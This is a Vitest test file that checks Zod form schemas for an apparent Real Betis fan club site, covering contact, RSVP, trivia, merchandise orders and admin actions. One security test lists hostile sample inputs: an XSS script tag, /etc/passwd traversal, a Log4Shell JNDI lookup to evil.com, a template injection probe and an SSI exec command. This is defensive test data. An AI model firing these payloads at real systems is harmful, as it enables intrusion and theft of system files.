import { describe, it, expect } from 'vitest';
import { contactSchema } from '@/lib/schemas/contact';
import { rsvpSchema } from '@/lib/schemas/rsvp';
import { triviaScoreSchema } from '@/lib/schemas/trivia';
import { voterSchema, preOrderDataSchema } from '@/lib/schemas/voting';
import { createMerchandiseSchema } from '@/lib/schemas/merchandise';
import { createOrderSchema } from '@/lib/schemas/orders';
import { userUpdateSchema, matchSchema } from '@/lib/schemas/admin';
import { ZodError } from 'zod';

describe('Cross-Schema Integration Tests', () => {
  describe('User Journey Integration', () => {
    it('should validate complete user registration and interaction flow', () => {
      const userEmail = 'juan.perez@example.com';
      const userName = 'Juan Pérez';

      // Step 1: User fills contact form
      const contactData = {
        name: userName,
        email: userEmail,
        phone: '+34-123-456-789',
        type: 'general' as const,
        subject: 'Consulta sobre membresía',
        message: 'Me gustaría unirme a la peña'
      };

      const contactResult = contactSchema.parse(contactData);
      expect(contactResult.email).toBe(userEmail);
      expect(contactResult.name).toBe(userName);

      // Step 2: User makes RSVP for match
      const rsvpData = {
        name: userName,
        email: userEmail,
        attendees: 2,
        message: 'Estaré allí con mi hijo'
      };

      const rsvpResult = rsvpSchema.parse(rsvpData);
      expect(rsvpResult.email).toBe(userEmail);
      expect(rsvpResult.name).toBe(userName);

      // Step 3: User plays trivia
      const triviaData = { score: 5 };
      const triviaResult = triviaScoreSchema.parse(triviaData);
      expect(triviaResult.score).toBe(5);

      // Step 4: User votes on merchandise
      const voterData = {
        name: userName,
        email: userEmail
      };

      const voterResult = voterSchema.parse(voterData);
      expect(voterResult.email).toBe(userEmail);
      expect(voterResult.name).toBe(userName);

      // All operations should use consistent user data
      expect(contactResult.email).toBe(rsvpResult.email);
      expect(contactResult.email).toBe(voterResult.email);
    });

    it('should handle merchandise ordering flow', () => {
      const customerInfo = {
        name: 'María García',
        email: 'maria.garcia@example.com',
        phone: '+34-987-654-321',
        contactMethod: 'whatsapp' as const
      };

      // Step 1: Create merchandise item
      const merchandiseData = {
        name: 'Camiseta Oficial Betis 2024',
        description: 'Camiseta oficial primera equipación',
        price: 79.95,
        category: 'clothing' as const,
        inStock: true,
        featured: true
      };

      const merchandiseResult = createMerchandiseSchema.parse(merchandiseData);
      expect(merchandiseResult.name).toBe('Camiseta Oficial Betis 2024');

      // Step 2: User creates order for merchandise
      const orderData = {
        productId: 'camiseta_betis_2024',
        productName: merchandiseResult.name,
        price: merchandiseResult.price,
        quantity: 1,
        totalPrice: merchandiseResult.price,
        customerInfo,
        isPreOrder: false
      };

      const orderResult = createOrderSchema.parse(orderData);
      expect(orderResult.customerInfo.email).toBe(customerInfo.email);
      expect(orderResult.productName).toBe(merchandiseResult.name);
      expect(orderResult.price).toBe(merchandiseResult.price);
    });

    it('should validate admin management workflow', () => {
      const adminEmail = 'admin@realbetisedi.com';

      // Step 1: Update user role
      const userUpdateData = {
        userId: 'user_12345',
        role: 'moderator' as const,
        banned: false
      };

      const userUpdateResult = userUpdateSchema.parse(userUpdateData);
      expect(userUpdateResult.role).toBe('moderator');

      // Step 2: Create match
      const matchData = {
        date_time: '2024-03-20T18:30:00Z',
        opponent: 'Valencia CF',
        competition: 'La Liga',
        home_away: 'home' as const,
        matchday: 28
      };

      const matchResult = matchSchema.parse(matchData);
      expect(matchResult.opponent).toBe('Valencia CF');

      // Both operations should be valid admin actions
      expect(userUpdateResult.role).toBeDefined();
      expect(matchResult.opponent).toBeDefined();
    });
  });

  describe('Data Consistency Validation', () => {
    it('should ensure email format consistency across all schemas', () => {
      const testEmail = 'TEST.USER@EXAMPLE.COM';
      const expectedEmail = 'test.user@example.com';

      // Test contact schema
      const contactData = {
        name: 'Test User',
        email: testEmail,
        phone: '+34-123-456-789',
        type: 'general' as const,
        subject: 'Test subject',
        message: 'Test message'
      };

      const contactResult = contactSchema.parse(contactData);
      expect(contactResult.email).toBe(expectedEmail);

      // Test RSVP schema
      const rsvpData = {
        name: 'Test User',
        email: testEmail,
        attendees: 1
      };

      const rsvpResult = rsvpSchema.parse(rsvpData);
      expect(rsvpResult.email).toBe(expectedEmail);

      // Test voter schema
      const voterData = {
        name: 'Test User',
        email: testEmail
      };

      const voterResult = voterSchema.parse(voterData);
      expect(voterResult.email).toBe(expectedEmail);

      // All should normalize to same format
      expect(contactResult.email).toBe(rsvpResult.email);
      expect(rsvpResult.email).toBe(voterResult.email);
    });

    it('should ensure name format consistency across schemas', () => {
      const testName = '  José María  ';
      const expectedName = 'José María';

      // Test schemas that trim names
      const contactResult = contactSchema.parse({
        name: testName,
        email: 'test@example.com',
        phone: '+34-123-456-789',
        type: 'general',
        subject: 'Test',
        message: 'Test message'
      });

      const rsvpResult = rsvpSchema.parse({
        name: testName,
        email: 'test@example.com',
        attendees: 1
      });

      const voterResult = voterSchema.parse({
        name: testName,
        email: 'test@example.com'
      });

      expect(contactResult.name).toBe(expectedName);
      expect(rsvpResult.name).toBe(expectedName);
      expect(voterResult.name).toBe(expectedName);
    });
  });

  describe('Business Logic Integration', () => {
    it('should validate merchandise voting and pre-order workflow', () => {
      const voterInfo = {
        name: 'Ana López',
        email: 'ana.lopez@example.com'
      };

      // Step 1: User votes on design
      const voterResult = voterSchema.parse(voterInfo);
      expect(voterResult.email).toBe('ana.lopez@example.com');

      // Step 2: User places pre-order
      const preOrderData = {
        name: voterInfo.name,
        email: voterInfo.email,
        size: 'M' as const,
        quantity: 1,
        preferredDesign: 'Design A'
      };

      const preOrderResult = preOrderDataSchema.parse(preOrderData);
      expect(preOrderResult.email).toBe(voterInfo.email);
      expect(preOrderResult.name).toBe(voterInfo.name);

      // Should use consistent user information
      expect(voterResult.email).toBe(preOrderResult.email);
      expect(voterResult.name).toBe(preOrderResult.name);
    });

    it('should validate match RSVP and trivia participation correlation', () => {
      const userInfo = {
        name: 'Carlos Ruiz',
        email: 'carlos.ruiz@example.com'
      };

      // Step 1: User RSVPs for match
      const rsvpData = {
        ...userInfo,
        attendees: 3,
        message: 'Vamos con la familia'
      };

      const rsvpResult = rsvpSchema.parse(rsvpData);
      expect(rsvpResult.attendees).toBe(3);

      // Step 2: User plays trivia before match
      const triviaScore = 4; // 4 out of 5 questions correct
      const triviaResult = triviaScoreSchema.parse({ score: triviaScore });
      expect(triviaResult.score).toBe(4);

      // Both activities should be valid for same user
      expect(rsvpResult.name).toBe(userInfo.name);
      expect(triviaResult.score).toBeGreaterThan(0);
    });
  });

  describe('Error Propagation and Handling', () => {
    it('should handle cascading validation errors', () => {
      const invalidEmail = 'invalid-email-format';

      // All schemas using email should fail consistently
      expect(() => contactSchema.parse({
        name: 'Test',
        email: invalidEmail,
        phone: '+34-123-456-789',
        type: 'general',
        subject: 'Test',
        message: 'Test'
      })).toThrow(ZodError);

      expect(() => rsvpSchema.parse({
        name: 'Test',
        email: invalidEmail,
        attendees: 1
      })).toThrow(ZodError);

      expect(() => voterSchema.parse({
        name: 'Test',
        email: invalidEmail
      })).toThrow(ZodError);
    });

    it('should handle schema-specific validation differences', () => {
      // Contact allows phone, RSVP doesn't require it
      const contactWithPhone = {
        name: 'Test User',
        email: 'test@example.com',
        phone: '+34-123-456-789',
        type: 'general' as const,
        subject: 'Test',
        message: 'Test message'
      };

      const rsvpWithoutPhone = {
        name: 'Test User',
        email: 'test@example.com',
        attendees: 1
      };

      // Both should be valid despite different requirements
      const contactResult = contactSchema.parse(contactWithPhone);
      const rsvpResult = rsvpSchema.parse(rsvpWithoutPhone);

      expect(contactResult.phone).toBe('+34-123-456-789');
      expect(rsvpResult.email).toBe('test@example.com');
    });
  });

  describe('Performance Integration Tests', () => {
    it('should handle mixed schema validations efficiently', () => {
      const startTime = performance.now();

      // Simulate processing multiple form types simultaneously
      for (let i = 0; i < 100; i++) {
        const email = `user${i}@example.com`;
        const name = `User ${i}`;

        // Contact form
        contactSchema.parse({
          name,
          email,
          phone: '+34-123-456-789',
          type: 'general',
          subject: 'Test subject',
          message: 'Test message'
        });

        // RSVP form
        rsvpSchema.parse({
          name,
          email,
          attendees: (i % 10) + 1
        });

        // Trivia score
        triviaScoreSchema.parse({
          score: i % 101
        });
      }

      const endTime = performance.now();
      expect(endTime - startTime).toBeLessThan(500); // Should complete quickly
    });

    it('should handle concurrent cross-schema operations', async () => {
      const operations = Array.from({ length: 50 }, (_, i) => {
        return Promise.all([
          Promise.resolve(contactSchema.parse({
            name: `User ${i}`,
            email: `user${i}@example.com`,
            phone: '+34-123-456-789',
            type: 'general',
            subject: 'Test',
            message: 'Test message'
          })),
          Promise.resolve(rsvpSchema.parse({
            name: `User ${i}`,
            email: `user${i}@example.com`,
            attendees: (i % 5) + 1
          })),
          Promise.resolve(triviaScoreSchema.parse({
            score: i % 101
          }))
        ]);
      });

      const results = await Promise.all(operations);
      
      expect(results).toHaveLength(50);
      results.forEach((operationGroup, i) => {
        expect(operationGroup).toHaveLength(3); // Contact, RSVP, Trivia
        expect(operationGroup[0].email).toBe(`user${i}@example.com`);
        expect(operationGroup[1].email).toBe(`user${i}@example.com`);
        expect(operationGroup[2].score).toBe(i % 101);
      });
    });
  });

  describe('Data Migration and Backwards Compatibility', () => {
    it('should handle legacy data formats', () => {
      // Simulate old contact form data that might not have all current fields
      const legacyContactData = {
        name: 'Legacy User',
        email: 'legacy@example.com',
        subject: 'Old format',
        message: 'This is from old system'
        // Missing phone and type (should use defaults)
      };

      const result = contactSchema.parse(legacyContactData);
      expect(result.name).toBe('Legacy User');
      expect(result.type).toBe('general'); // Default value
      expect(result.phone).toBeUndefined();
    });

    it('should validate schema evolution compatibility', () => {
      // Test that new optional fields don't break existing data
      const minimalValidData = {
        contact: {
          name: 'Minimal User',
          email: 'minimal@example.com',
          subject: 'Min',
          message: 'Minimal message'
        },
        rsvp: {
          name: 'Minimal User',
          email: 'minimal@example.com',
          attendees: 1
        },
        trivia: {
          score: 0
        }
      };

      const contactResult = contactSchema.parse(minimalValidData.contact);
      const rsvpResult = rsvpSchema.parse(minimalValidData.rsvp);
      const triviaResult = triviaScoreSchema.parse(minimalValidData.trivia);

      expect(contactResult.name).toBeDefined();
      expect(rsvpResult.name).toBeDefined();
      expect(triviaResult.score).toBeDefined();
    });
  });

  describe('Security and Validation Integration', () => {
    it('should consistently reject malicious input across schemas', () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        'javascript:void(0)',
        '../../etc/passwd',
        '${jndi:ldap://evil.com}',
        '{{7*7}}',
        '<!--#exec cmd="/bin/cat /etc/passwd"-->'
      ];

      maliciousInputs.forEach(maliciousInput => {
        // All text fields should accept but not execute malicious content
        const contactResult = contactSchema.parse({
          name: maliciousInput,
          email: 'test@example.com',
          phone: '+34-123-456-789',
          type: 'general',
          subject: 'Test',
          message: maliciousInput
        });

        expect(contactResult.name).toBe(maliciousInput);
        expect(contactResult.message).toBe(maliciousInput);
      });
    });

    it('should validate input length limits consistently', () => {
      // Test that length limits are enforced across similar fields
      const longName = 'A'.repeat(100); // Exceeds most name limits
      const veryLongText = 'A'.repeat(2000); // Exceeds most text limits

      // Should fail in schemas with name length limits
      expect(() => contactSchema.parse({
        name: longName,
        email: 'test@example.com',
        phone: '+34-123-456-789',
        type: 'general',
        subject: 'Test',
        message: 'Test'
      })).toThrow(ZodError);

      expect(() => rsvpSchema.parse({
        name: longName,
        email: 'test@example.com',
        attendees: 1
      })).toThrow(ZodError);

      expect(() => contactSchema.parse({
        name: 'Test',
        email: 'test@example.com',
        phone: '+34-123-456-789',
        type: 'general',
        subject: 'Test',
        message: veryLongText
      })).toThrow(ZodError);
    });
  });
});